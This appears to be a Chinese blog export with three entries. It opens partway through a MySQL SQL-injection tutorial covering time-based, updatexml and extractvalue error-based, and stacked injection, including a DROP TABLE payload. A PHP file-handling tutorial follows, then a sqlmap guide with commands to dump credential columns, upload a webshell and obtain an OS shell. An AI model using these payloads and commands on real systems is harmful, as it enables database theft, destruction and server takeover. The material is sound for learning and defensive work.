<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&#x27;admin&#x27; AND IF(BENCHMARK(10,MD5(&#x27;test&#x27;)),1,0)</span><br></pre></td></tr></table></figure>

<p>如果数据库中不存在用户名为<code>admin</code>的用户，那么该语句将会立即返回；否则，程序将会重复执行<code>MD5(&#39;test&#39;)</code>函数10次后再返回结果</p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>顾名思义，通过报错信息获取数据的方法。</p>
<ul>
<li><code>updatexml()</code></li>
</ul>
<p>这里我们先讲 <code>updatexml()</code> 报错注入。</p>
<p><code>updatexml()</code> 是MySQL中的一种XML处理函数，它用于更新XML格式的数 据，其标准的用法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATEXML(xml_target, xpath_expr, new_value)</span><br></pre></td></tr></table></figure>

<p>其中，<code>xml_target</code>是要更新的XML数据，<code>xpath_expr</code>是要更新的节点路 径，<code>new_value</code>是新的节点值。</p>
<p>但是这个函数有一个缺陷，如果二个参数包含特殊符号时会报错，并且会第二 个参数的内容显示在报错信息中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT username, password FROM users WHERE id = 1 and    updatexml(1, 0x7e, 3);</span><br><span class="line">1105 - XPATH syntax error: &#x27;~&#x27;</span><br></pre></td></tr></table></figure>

<p>那么通过这个特性，我们用 <code>concat()</code> 函数 将查询语句和特殊符号拼接 在一起，就可以将查询结果显示在报错信息中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and updatexml(1, concat(0x7e,version()), 3) </span><br></pre></td></tr></table></figure>

<p>输出:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT username, password FROM users WHERE id = 1 and  updatexml(1, concat(0x7e,version()), 3);</span><br><span class="line">1105 - XPATH syntax error: &#x27;~8.0.12&#x27;</span><br></pre></td></tr></table></figure>

<p>不过要注意的是 <code>updatexml()</code> 的报错长度存在字符长度限制，目前有两 种方法来解决这个问题：</p>
<ul>
<li><code>LIMIT()</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and   updatexml(1,concat(0x7e,</span><br><span class="line">(select username from users </span><br><span class="line">limit 1,1)),</span><br><span class="line">3);</span><br><span class="line"># 不断改变limit NUM,1 的值逐行获取</span><br></pre></td></tr></table></figure>

<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305050110708.png" alt="image-20230505011056626"></p>
<ul>
<li><p><code>substr()</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and updatexml(1,concat(0x7e,</span><br><span class="line">substr(</span><br><span class="line">(select group_concat(username) from users),</span><br><span class="line">1,31)</span><br><span class="line">),3);</span><br></pre></td></tr></table></figure>



<p>执行结果：</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT username, password FROM users WHERE id = 1 and updatexml(1,concat(0x7e,</span><br><span class="line">substr(</span><br><span class="line">(select group_concat(username) from users),1,31)</span><br><span class="line">),3);</span><br><span class="line">1105 - XPATH syntax error: &#x27;~admin,super,flag,null&#x27;</span><br></pre></td></tr></table></figure>

<p>利用利用上述特性，我们可以下面的语句获取信息：</p>
<p>获取所有数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and</span><br><span class="line">updatexml(1,concat(&#x27;~&#x27;,</span><br><span class="line">        substr( </span><br><span class="line">                (select group_concat(schema_name)</span><br><span class="line">                from information_schema.schemata)</span><br><span class="line">        , 1 , 31)</span><br><span class="line">),3)</span><br></pre></td></tr></table></figure>

<p>获取所有表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and</span><br><span class="line">updatexml(1,concat(&#x27;~&#x27;,</span><br><span class="line">        substr( </span><br><span class="line">                (select group_concat(table_name)</span><br><span class="line">                from information_schema.tables</span><br><span class="line">                where table_schema = &#x27;security&#x27;)</span><br><span class="line">        , 1 , 31)</span><br><span class="line">),3)</span><br></pre></td></tr></table></figure>

<p>获取所有字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id = 1 and</span><br><span class="line">updatexml(1,concat(&#x27;~&#x27;,</span><br><span class="line">        substr( </span><br><span class="line">                (select group_concat(column_name)</span><br><span class="line">                from information_schema.columns</span><br><span class="line">                where table_schema = &#x27;security&#x27; and table_name = &#x27;users&#x27;)</span><br><span class="line">        , 1 , 31)</span><br><span class="line">),3)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>extractvalue()</code></li>
</ul>
<p><code>extractvalue()</code>是MySQL中的一个XML处理函数，它用于从XML格式的数据中提取指定节点的值。</p>
<p>正常情况下他的语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXTRACTVALUE(xml_target, xpath_expr)</span><br></pre></td></tr></table></figure>

<p>其中，<code>xml_target</code>是要提取节点值的XML数据，<code>xpath_expr</code>是要提取的节点路径。</p>
<p>它用于报错注入的方法其实和 <code>updatexml()</code> 函数的使用方法差不多 但是参数少一个x</p>
<p><img src="https://nssctf.wdf.ink//img/WDTJ/202305050150790.png" alt="image-20230505015028726"></p>
<p>而且报错信息长度限制也和<code>updatexml()</code> 一样，所以这里就不多做赘述。</p>
<ul>
<li><code>floor()</code></li>
<li><code>exp()</code></li>
</ul>
<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>顾名思义x 一堆 SQL语句(多条)一起执行方法被称为堆叠注入。</p>
<p>其实讲原理就很容易懂：</p>
<p>在执行SQL语句时，如果SQL语句中包含多个SQL语句，数据库服务器会依次执行这些SQL语句，从而导致多次SQL注入攻击。通过在SQL语句中使用分号（;）来分隔多个SQL语句，从而实现堆叠注入攻击。</p>
<p>举个栗子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id =1; DROP TABLE users;--</span><br></pre></td></tr></table></figure>

<p>执行这个SQL语句时，数据库服务器会依次执行这两个SQL语句，将会查询到<code>users</code>表中的用户名和密码，并且将<code>users</code>表删除。</p>
]]></content>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP</title>
    <url>/2023/08/09/PHP/</url>
    <content><![CDATA[<h2 id="基本的-PHP-语法"><a href="#基本的-PHP-语法" class="headerlink" title="基本的 PHP 语法"></a>基本的 PHP 语法</h2><span id="more"></span>

<p>PHP 脚本以 <strong><?php** 开始，以 **?></strong> 结束：</p>
<?php
 // PHP 代码
 ?>

<p>PHP 文件的默认文件扩展名是 “.php”。</p>
<p>PHP echo 和 print 语句</p>
<p>echo 和 print 区别:</p>
<ul>
<li>echo - 可以输出一个或多个字符串</li>
<li>print - 只允许输出一个字符串，返回值总为 1</li>
</ul>
<p> goto循环语句</p>
<pre><code>王同学每周往返,但有一个特例:项目失败后或者集团临时通知除外,就可以不再这么每周往返了.
</code></pre>
<p>基本语法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">goto wan;</span><br><span class="line">echo &#x27;天王盖地虎&#x27;;</span><br><span class="line">wan:</span><br><span class="line">echo &#x27;小鸡炖蘑菇&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>基本编写:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i=0;$i&lt;100;$i++)&#123;</span><br><span class="line">    echo &#x27;第&#x27;.$i.&#x27;每周往返北京大连&lt;br /&gt;&#x27;;</span><br><span class="line">    if($i == 17)&#123;</span><br><span class="line">        goto end;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">end:</span><br><span class="line">echo &#x27;停止此项&#x27;;</span><br></pre></td></tr></table></figure>



<h3 id="PHP文件系统管理"><a href="#PHP文件系统管理" class="headerlink" title="PHP文件系统管理"></a>PHP文件系统管理</h3><p>(1)fopen、fread、fclose操作读取文件</p>
<p>1.readfile读取文件函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">readfile ( string: $文件名)</span><br><span class="line">功能：传入一个文件路径，输出一个文件。</span><br></pre></td></tr></table></figure>

<p>下面的这一段代码中，只要传入文件名或者指定的文件路径就把文件读取出来了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   //linux类的读了方式</span><br><span class="line">   readfile(&quot;/home/paul/test.txt&quot;);</span><br><span class="line">   //windows类的读取方式</span><br><span class="line">   readfile(&quot;c:\oldboyoldboyoot.ini&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">注意：上面的代码中windows的斜线是斜线，可能会转义掉一些字符。因此，我们写的时候写上两个斜线。</span><br></pre></td></tr></table></figure>

<p>2、file_get_contents打开文件函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $filename = &#x27;NoAlike.txt&#x27;;</span><br><span class="line">   $filestring = file_get_contents($filename);</span><br><span class="line">   echo $filestring;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>3、fopen、fread、fclose操作读取文件</p>
<p>上面file_get_contents打开文件的方式简单、粗暴。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resource fopen	 	    ( string $文件名, string 模式)</span><br><span class="line">string fread 			( resource $操作资源, int 读取长度)</span><br><span class="line">bool fclose 			( resource $操作资源 )</span><br></pre></td></tr></table></figure>

<p>fopen的模式有下面几个</p>
<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230809110222323.png" alt="image-20230809110222323"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   //你可以创建一个NoAlike.txt，以只读模式打开</span><br><span class="line">   $fp = fopen(&#x27;NoAlike.txt&#x27;, &quot;r&quot;);</span><br><span class="line">   //var_dump()操作一下$fp看看效果，输出的是不是只有类型提示的是resource</span><br><span class="line">   var_dump($fp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>(2)PHP创建和修改文件内容</p>
<p>1、file_put_contents写入文件</p>
<p>第一种写入文件的方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_put_contents ( string $文件路径, string $写入数据)</span><br><span class="line">功能：向指定的文件当中写入一个字符串，如果文件不存在则创建文件。返回的是写入的字节长度</span><br></pre></td></tr></table></figure>

<p>操作代码演示示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $data = &quot;在PHP中文网学好PHP，不再话下！&quot;;</span><br><span class="line">   $numbytes = file_put_contents(&#x27;test.txt&#x27;, $data);</span><br><span class="line">   if($numbytes)&#123;</span><br><span class="line">       echo &#x27;写入成功，我们读取看看结果试试：&#x27;;</span><br><span class="line">       echo file_get_contents(&#x27;test.txt&#x27;);</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">       echo &#x27;写入失败或者没有权限，注意检查&#x27;;</span><br><span class="line">   &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>2、fwrite配合fopen进行写入操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $filename = &#x27;test.txt&#x27;;</span><br><span class="line">   $fp= fopen($filename, &quot;w&quot;);</span><br><span class="line">   $len = fwrite($fp, &#x27;我是一只来自北方的狼，却在南方冻成了狗&#x27;);</span><br><span class="line">   fclose($fp);</span><br><span class="line">   print $len .&#x27;字节被写入了</span><br><span class="line">&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码说明：<br>· 不论有没有新建都会打开文件重新写入<br>· 原有的文件内容会被覆盖掉<br>· 文件不存在会创建</p>
<p>(3) PHP创建临时文件</p>
<pre><code>我们之前创建的文件都是永久文件，而创建临时文件在我们平时的项目开发中也非常有用，创建临时文件的好处：文件操作完成后即删除，不需要去维护这个文件的删除状态。
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   //创建了一个临时文件</span><br><span class="line">   $handle = tmpfile();</span><br><span class="line">   //向里面写入了数据</span><br><span class="line">   $numbytes = fwrite($handle, &#x27;写入临时文件&#x27;);</span><br><span class="line">   //关闭临时文件，文件即被删除</span><br><span class="line">   fclose($handle);</span><br><span class="line">   echo  &#x27;向临时文件中写入了&#x27;.$numbytes . &#x27;个字节&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>(4) php移动、拷贝和删除文件</p>
<p>我们日常在处理文件的时候，可以删除文件、重命名文件也可以也可复制文件。</p>
<p>1、重命名文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rename($旧名,$新名);</span><br><span class="line">功能：这个函数返回一个bool值，将旧的名字改为新的名字。</span><br></pre></td></tr></table></figure>

<p>操作示例说明：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   //旧文件名</span><br><span class="line">   $filename = &#x27;test.txt&#x27;;</span><br><span class="line">   //新文件名</span><br><span class="line">   $filename2 = $filename . &#x27;.old&#x27;;</span><br><span class="line">   //复制文件</span><br><span class="line">   rename($filename, $filename2);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>2、复制文件<br>复制文件，就相当于是克隆技术，将一个原来的东西再克隆成一个新的东西，两个长得一模一样。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy(源文件,目标文件)</span><br><span class="line">功能：将指定路径的源文件，复制一份到目标文件的位置。</span><br></pre></td></tr></table></figure>

<p>操作示例说明：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   //旧文件名</span><br><span class="line">   $filename = &#x27;copy.txt&#x27;;</span><br><span class="line">   //新文件名</span><br><span class="line">   $filename2 = $filename . &#x27;_backup&#x27;;</span><br><span class="line">   //修改名字。</span><br><span class="line">   copy($filename, $filename2);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>


<p>说明：会通过上面的例子，发现多出来了一个文件。</p>
<p>3、删除文件</p>
<p>删除文件就是将指定路径的一个文件删除，不过这个删除是直接删除。使用的是windows电脑，你在回收站看不到这个文件，你只会发现这个文件消失了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unlink(指定路径的文件)</span><br></pre></td></tr></table></figure>

<p>代码操作示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $filename = &#x27;test.txt&#x27;;</span><br><span class="line">   if (unlink($filename)) &#123;</span><br><span class="line">       echo  &quot;删除文件成功 $filename!</span><br><span class="line">&quot;;</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">       echo  &quot;删除 $filename 失败!</span><br><span class="line">&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>4、检测文件属性函数</p>
<p>假设安装界面的网址是：install.php，安装的锁文件是install.lock。我们就可以检测install.lock文件是否存在。</p>
<pre><code>&lt;?php
if(file_exists(&#39;install.lock&#39;))&#123;
   echo &#39;已安装，请不要再次进行安装&#39;;
   exit;
&#125;
?&gt;
</code></pre>
<p>5、PHP目录处理函数</p>
<p>php 目录处理函数处理文件夹的基本思想如下：<br>1.读取某个路径的时候判断是否是文件夹<br>2.是文件夹的话，打开指定文件夹，返回文件目录的资源变量<br>3.使用readdir读取一次目录中的文件，目录指针向后偏移一次<br>4.使用readdir读取到最后，没有可读的文件返回false<br>5.关闭文件目录<br><strong>代码演示操作</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//设置打开的目录是D盘</span><br><span class="line">$dir = &quot;d:/&quot;;</span><br><span class="line">//判断是否是文件夹，是文件夹</span><br><span class="line">if (is_dir($dir)) &#123;</span><br><span class="line">   if ($dh = opendir($dir)) &#123;</span><br><span class="line">      //读取到最后返回false，停止循环</span><br><span class="line">      while (($file = readdir($dh)) !== false) &#123;</span><br><span class="line">           echo &quot;文件名为: $file : 文件的类型是: &quot; . filetype($dir . $file) . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">       &#125;</span><br><span class="line">       closedir($dh);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>6、php 文件权限设置<br>chmod主要是修改文件的的权限</p>
<pre><code>&lt;?php
//修改linux系统/var/wwwroot/某文件权限为755
chmod(&quot;/var/wwwroot/index.html&quot;, 755);  
chmod(&quot;/var/wwwroot/index.html&quot;, &quot;u+rwx,go+rx&quot;); 
chmod(&quot;/somedir/somefile&quot;, 0755); 
?&gt;
</code></pre>
<p>7、php文件路径函数</p>
<p>我们经常会遇到处理文件路径的情况。例如：<br>1.文件后缀需要取出来<br>2.路径需要取出名字不取目录<br>3.只需要取出路径名中的目录路径<br>4.或者把网址中的各个部份进行解析取得独立值<br>5.甚至是自己组成一个url出来</p>
<p>很多地方都需要用路径处理类的函数。把常用的路径处理函数为大家做了标注，对着这个路径处理函数进行处理即可：在这里插入图片描述</p>
<p>代码示例说明：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$path_parts = pathinfo(&#x27;d:/www/index.inc.php&#x27;);</span><br><span class="line">echo &#x27;文件目录名：&#x27;.$path_parts[&#x27;dirname&#x27;].&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo &#x27;文件全名：&#x27;.$path_parts[&#x27;basename&#x27;].&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo &#x27;文件扩展名：&#x27;.$path_parts[&#x27;extension&#x27;].&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo &#x27;不包含扩展的文件名：&#x27;.$path_parts[&#x27;filename&#x27;].&quot;&lt;br /&gt;&quot;; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>8、php实现文件留言本</p>
<p>我们来看一下文件结构：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php		展示输入框和留言内容</span><br><span class="line">write.php 		向message.txt写入数据</span><br><span class="line">message.txt 		存入聊天内容</span><br></pre></td></tr></table></figure>

<p>编写index.php文件信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//设置时区</span><br><span class="line">date_default_timezone_set(&#x27;PRC&#x27;);</span><br><span class="line">//读了内容</span><br><span class="line">@$string = file_get_contents(&#x27;message.txt&#x27;);</span><br><span class="line">//如果$string 不为空的时候执行，也就是message.txt中有留言数据</span><br><span class="line">if (!empty($string)) &#123;</span><br><span class="line">    //每一段留言有一个分格符，但是最后多出了一个&amp;^。因此，我们要将&amp;^删掉</span><br><span class="line">    $string = rtrim($string, &#x27;&amp;^&#x27;);</span><br><span class="line">    //以&amp;^切成数组</span><br><span class="line">    $arr = explode(&#x27;&amp;^&#x27;, $string);</span><br><span class="line">    //将留言内容读取</span><br><span class="line">    foreach ($arr as $value) &#123;</span><br><span class="line">        //将用户名和内容分开</span><br><span class="line">        list($username, $content, $time) = explode(&#x27;$#&#x27;, $value);</span><br><span class="line">        echo &#x27;用户名为&lt;font color=&quot;gree&quot;&gt;&#x27; . $username . &#x27;&lt;/font&gt;内容为&lt;font color=&quot;red&quot;&gt;&#x27; . $content . &#x27;&lt;/font&gt;时间为&#x27; . date(&#x27;Y-m-d H:i:s&#x27;, $time);</span><br><span class="line">        echo &#x27;&lt;hr /&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;h1&gt;基于文件的留言本演示&lt;/h1&gt;</span><br><span class="line">&lt;form action=&quot;write.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">    用户名：&lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;&lt;br /&gt;</span><br><span class="line">    留言内容：&lt;textarea  name=&quot;content&quot;&gt;&lt;/textarea&gt;&lt;br /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>看了刚刚的展示内容，我们知道文件存储时：<br>1、段与段之间进行了分割<br>2、内容与用户之前用一个特殊的符号进行了分割</p>
<p>下面我们来写write.php写入留言至文件的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//追加方式打开文件</span><br><span class="line">$fp=fopen(&#x27;message.txt&#x27;,&#x27;a&#x27;);</span><br><span class="line">//设置时间</span><br><span class="line">$time=time();</span><br><span class="line">//得到用户名</span><br><span class="line">$username=trim($_POST[&#x27;username&#x27;]);</span><br><span class="line">//得到内容</span><br><span class="line">$content=trim($_POST[&#x27;content&#x27;]);</span><br><span class="line">//组合写入的字符串：内容和用户之间分开，使用$#</span><br><span class="line">//行与行之间分开，使用&amp;^</span><br><span class="line">$string=$username.&#x27;$#&#x27;.$content.&#x27;$#&#x27;.$time.&#x27;&amp;^&#x27;;</span><br><span class="line">//写入文件</span><br><span class="line">fwrite($fp,$string);</span><br><span class="line">//关闭文件</span><br><span class="line">fclose($fp);</span><br><span class="line">header(&#x27;location:index.php&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>参考文章：<br> <a href="https://www.runoob.com/php/php-tutorial.html">PHP 教程</a></p>
]]></content>
      <tags>
        <tag>语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqlmap</title>
    <url>/2023/09/03/Sqlmap/</url>
    <content><![CDATA[<h3 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a>sqlmap简介</h3><span id="more"></span>

<p>sqlmap支持五种不同的注入模式：</p>
<ul>
<li>1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</li>
<li>2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li>
<li>3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</li>
<li>4、联合查询注入，可以使用union的情况下的注入。</li>
<li>5、堆查询注入，可以同时执行多条语句的执行时的注入。</li>
</ul>
<h3 id="sqlmap支持的数据库有"><a href="#sqlmap支持的数据库有" class="headerlink" title="sqlmap支持的数据库有"></a>sqlmap支持的数据库有</h3><p>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p>
<h2 id="检测注入"><a href="#检测注入" class="headerlink" title="检测注入"></a>检测注入</h2><h3 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u “http://www.vuln.cn/post.php?id=1”</span><br></pre></td></tr></table></figure>

<p>默认使用level1检测全部数据库类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3</span><br></pre></td></tr></table></figure>

<p>指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）</p>
<h3 id="跟随302跳转"><a href="#跟随302跳转" class="headerlink" title="跟随302跳转"></a>跟随302跳转</h3><p>当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，<br> 当注入错误的时候，先报错再跳转的时候，不需要跟随302。<br> 目的就是：要追踪到错误信息。</p>
<h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>当程序有防get注入的时候，可以使用cookie注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u “http://www.baidu.com/shownews.asp” –cookie “id=11” –level 2（只有level达到2才会检测cookie）</span><br></pre></td></tr></table></figure>

<h3 id="从post数据包中注入"><a href="#从post数据包中注入" class="headerlink" title="从post数据包中注入"></a>从post数据包中注入</h3><p>可以使用burpsuite或者temperdata等工具来抓取post包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql   指定username参数</span><br></pre></td></tr></table></figure>

<h2 id="注入成功后"><a href="#注入成功后" class="headerlink" title="注入成功后"></a>注入成功后</h2><h3 id="获取数据库基本信息"><a href="#获取数据库基本信息" class="headerlink" title="获取数据库基本信息"></a>获取数据库基本信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 –dbs</span><br></pre></td></tr></table></figure>

<p>查询有哪些数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test –tables</span><br></pre></td></tr></table></figure>

<p>查询test数据库中有哪些表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test -T admin –columns</span><br></pre></td></tr></table></figure>

<p>查询test数据库中admin表有哪些字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test -T admin -C “username,password” –dump</span><br></pre></td></tr></table></figure>

<p>dump出字段username与password中的数据</p>
<p>其他命令参考下面</p>
<h3 id="从数据库中搜索字段"><a href="#从数据库中搜索字段" class="headerlink" title="从数据库中搜索字段"></a>从数据库中搜索字段</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password</span><br></pre></td></tr></table></figure>

<p> 在dedecms数据库中搜索字段admin或者password。</p>
<h3 id="读取与写入文件"><a href="#读取与写入文件" class="headerlink" title="读取与写入文件"></a>读取与写入文件</h3><p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p>
<p>–file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）<br> –file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）<br> –file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径<br> 示例：<br> sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest  “e:\php\htdocs\dvwa\inc\include\1.php” –file-write  “f:\webshell\1112.php”</p>
<p>使用shell命令：</p>
<p>sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell<br> 接下来指定网站可写目录：<br> “E:\php\htdocs\dvwa”</p>
<p><strong>注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</strong></p>
<h2 id="sqlmap详细命令："><a href="#sqlmap详细命令：" class="headerlink" title="sqlmap详细命令："></a>sqlmap详细命令：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">–is-dba 当前用户权限（是否为root权限）</span><br><span class="line">–dbs 所有数据库</span><br><span class="line">–current-db 网站当前数据库</span><br><span class="line">–users 所有数据库用户</span><br><span class="line">–current-user 当前数据库用户</span><br><span class="line">–random-agent 构造随机user-agent</span><br><span class="line">–passwords 数据库密码</span><br><span class="line">–proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理</span><br><span class="line">–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</span><br></pre></td></tr></table></figure>

<h3 id="Options（选项）："><a href="#Options（选项）：" class="headerlink" title="Options（选项）："></a>Options（选项）：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-h, --help 显示基本帮助信息</span><br><span class="line"></span><br><span class="line">-hh</span><br><span class="line"></span><br><span class="line">显示高级帮助信息</span><br><span class="line"></span><br><span class="line">--version 显示程序版本号</span><br><span class="line"></span><br><span class="line">-v VERBOSE 赘言级别：0-6(默认 1)</span><br><span class="line"></span><br><span class="line">目标：</span><br><span class="line"></span><br><span class="line">-d DIRECT 直接连接到数据库</span><br><span class="line"></span><br><span class="line">-u URL, --url=URL 目标 URL(e.g. &quot;www.target.com/vuln.php?id=1&quot;)</span><br><span class="line"></span><br><span class="line">-l LOGFILE 从 Burp 或 WebScarab 日志中解析目标</span><br><span class="line"></span><br><span class="line">-m BULKFILE</span><br><span class="line"></span><br><span class="line">在给定的文本文件中读取多个扫描目标</span><br><span class="line"></span><br><span class="line">-g GOOGLEDORK 将 Google dork 结果作为目标 URL</span><br><span class="line"></span><br><span class="line">-r REQUESTFILE 从文件中读取 HTTP 请求</span><br><span class="line"></span><br><span class="line">-c CONFIGFILE 从 INI 配置文件中读取配置选项</span><br></pre></td></tr></table></figure>

<ul>
<li>保存进度继续跑：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” 保存进度</span><br><span class="line">sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” –resume 恢复已保存进度</span><br></pre></td></tr></table></figure>

<h3 id="Target（目标）："><a href="#Target（目标）：" class="headerlink" title="Target（目标）："></a>Target（目标）：</h3><p>以下至少需要设置其中一个选项，设置目标URL。</p>
